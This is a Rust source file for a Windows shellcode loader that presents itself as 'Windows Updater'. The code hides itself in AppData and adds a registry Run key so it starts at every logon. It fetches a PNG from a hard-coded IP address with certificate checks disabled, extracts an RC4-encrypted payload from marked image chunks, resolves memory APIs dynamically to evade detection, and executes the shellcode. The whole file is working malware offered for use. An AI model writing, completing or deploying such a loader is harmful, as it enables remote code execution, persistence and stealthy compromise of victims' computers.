//! Stealthy Shellcode Loader with PNG payload, Registry Persistence, and API Obfuscation
#![windows_subsystem = "windows"]

use std::env;
use std::fs;
use std::io;
use std::ptr::null_mut;
use std::ffi::CString;

use reqwest;
use winreg::enums::*;
use winreg::RegKey;
use windows::core::{PCSTR};
use windows::Win32::Foundation::{BOOL, HMODULE, FARPROC};
use windows::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
use windows::Win32::Storage::FileSystem::{SetFileAttributesA, FILE_ATTRIBUTE_HIDDEN};

const RC4_KEY_SIZE: usize = 16;
const CHUNK_TYPE_SIZE: usize = 4;
const BYTES_TO_SKIP: usize = 33;
const PNG_SIGNATURE: u32 = 0x89504E47;
const IEND_HASH: u32 = 0xAE426082;
const MARKED_IDAT_HASH: u32 =  0x8426BB32;


unsafe fn resolve_api<T>(dll: &str, func: &str) -> Option<T> {
    let dll_c = CString::new(dll).ok()?;
    let func_c = CString::new(func).ok()?;

    let hmod_result = LoadLibraryA(PCSTR(dll_c.as_ptr() as _));
    let hmod: HMODULE = match hmod_result.ok() {
        Some(h) => h,
        None => return None,
    };

    let addr: FARPROC = match GetProcAddress(hmod, PCSTR(func_c.as_ptr() as _)) {
        Some(a) => Some(a),
        None => return None,
    };

    Some(std::mem::transmute_copy(&addr))
}

fn add_to_startup(hidden_path: &str, app_name: &str) -> io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run = hkcu.open_subkey_with_flags("Software\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_WRITE)?;
    run.set_value(app_name, &hidden_path)?;
    Ok(())
}

fn hide_file(file_path: &str) {
    if let Ok(c_path) = CString::new(file_path) {
        unsafe {
            let _ = SetFileAttributesA(PCSTR(c_path.as_ptr() as _), FILE_ATTRIBUTE_HIDDEN);
        }
    }
}

fn copy_to_appdata() -> Option<String> {
    if let Ok(appdata) = env::var("APPDATA") {
        let target = format!("{}\\Microsoft\\Windows\\winupdater.exe", appdata);
        let current = env::current_exe().ok()?.to_string_lossy().to_string();

        if current.to_lowercase() != target.to_lowercase() {
            let _ = fs::create_dir_all(format!("{}\\Microsoft\\Windows", appdata));
            let _ = fs::copy(&current, &target);
            hide_file(&target);
            Some(target)
        } else {
            Some(current)
        }
    } else {
        None
    }
}

fn main() {
    if let Some(hidden_path) = copy_to_appdata() {
        let _ = add_to_startup(&hidden_path, "Windows Updater");
    }

    if let Ok(png) = download_png() {
        if let Ok(shellcode) = extract_decrypted_payload(png) {
            if shellcode.len() < 10 || shellcode.len() > 1024 * 1024 {
                return;
            }

            unsafe {
                let virtual_alloc: Option<unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void> =
                    resolve_api("kernel32.dll", "VirtualAlloc");

                let virtual_protect: Option<unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> BOOL> =
                    resolve_api("kernel32.dll", "VirtualProtect");

                if let (Some(va), Some(vp)) = (virtual_alloc, virtual_protect) {
                    let address = va(null_mut(), shellcode.len(), 0x3000, 0x04);
                    if address.is_null() {
                        return;
                    }

                    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), address as *mut u8, shellcode.len());

                    let mut old = 0;
                    let _ = vp(address, shellcode.len(), 0x40, &mut old);

                    let _ = std::panic::catch_unwind(|| {
                        let callback: extern "system" fn() = std::mem::transmute(address);
                        callback();
                    });
                }
            }
        }
    }
}

fn download_png() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let response = client
        .get("http://45.157.233.45/nokia360.png")
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .send()?;

    if !response.status().is_success() {
        return Err(format!("HTTP error: {}", response.status()).into());
    }

    Ok(response.bytes()?.to_vec())
}

fn extract_decrypted_payload(png_file_buffer: Vec<u8>) -> io::Result<Vec<u8>> {
    if png_file_buffer.len() < 4 || u32::from_be_bytes([png_file_buffer[0], png_file_buffer[1], png_file_buffer[2], png_file_buffer[3]]) != PNG_SIGNATURE {
        return Err(io::Error::new(io::ErrorKind::InvalidData, "Not a PNG file"));
    }

    let mut offset = BYTES_TO_SKIP;
    let mut found_hash = false;
    let mut decrypted_payload = Vec::new();

    while offset < png_file_buffer.len() {
        if offset + 8 > png_file_buffer.len() {
            break;
        }

        let section_length = u32::from_be_bytes([
            png_file_buffer[offset],
            png_file_buffer[offset + 1],
            png_file_buffer[offset + 2],
            png_file_buffer[offset + 3],
        ]) as usize;
        offset += 4 + CHUNK_TYPE_SIZE;

        if offset + section_length + 4 > png_file_buffer.len() {
            break;
        }

        let section_buffer = &png_file_buffer[offset..offset + section_length];
        offset += section_length;

        let crc32_hash = u32::from_be_bytes([
            png_file_buffer[offset],
            png_file_buffer[offset + 1],
            png_file_buffer[offset + 2],
            png_file_buffer[offset + 3],
        ]);
        offset += 4;

        if crc32_hash == IEND_HASH {
            break;
        }

        if crc32_hash == MARKED_IDAT_HASH {
            found_hash = true;
            continue;
        }

        if found_hash {
            if section_length < RC4_KEY_SIZE {
                continue;
            }

            let rc4_key = &section_buffer[..RC4_KEY_SIZE];
            let encrypted_data = &section_buffer[RC4_KEY_SIZE..];
            let decrypted_data = rc4_encrypt_decrypt(encrypted_data, rc4_key);
            decrypted_payload.extend_from_slice(&decrypted_data);
        }
    }

    if !found_hash {
        return Err(io::Error::new(io::ErrorKind::NotFound, "Marked IDAT hash not found"));
    }

    Ok(decrypted_payload)
}

struct Rc4 {
    s: [u8; 256],
    i: u8,
    j: u8,
}

impl Rc4 {
    fn new(key: &[u8]) -> Rc4 {
        let mut s = [0u8; 256];
        for i in 0..256 {
            s[i] = i as u8;
        }
        let mut j = 0u8;
        for i in 0..256 {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }
        Rc4 { s, i: 0, j: 0 }
    }

    fn process(&mut self, input: &[u8], output: &mut [u8]) {
        for (in_byte, out_byte) in input.iter().zip(output.iter_mut()) {
            self.i = self.i.wrapping_add(1);
            self.j = self.j.wrapping_add(self.s[self.i as usize]);
            self.s.swap(self.i as usize, self.j as usize);
            let k = self.s[(self.s[self.i as usize] as usize + self.s[self.j as usize] as usize) % 256];
            *out_byte = in_byte ^ k;
        }
    }
}

fn rc4_encrypt_decrypt(input: &[u8], key: &[u8]) -> Vec<u8> {
    let mut rc4 = Rc4::new(key);
    let mut output = vec![0; input.len()];
    rc4.process(input, &mut output);
    output
}
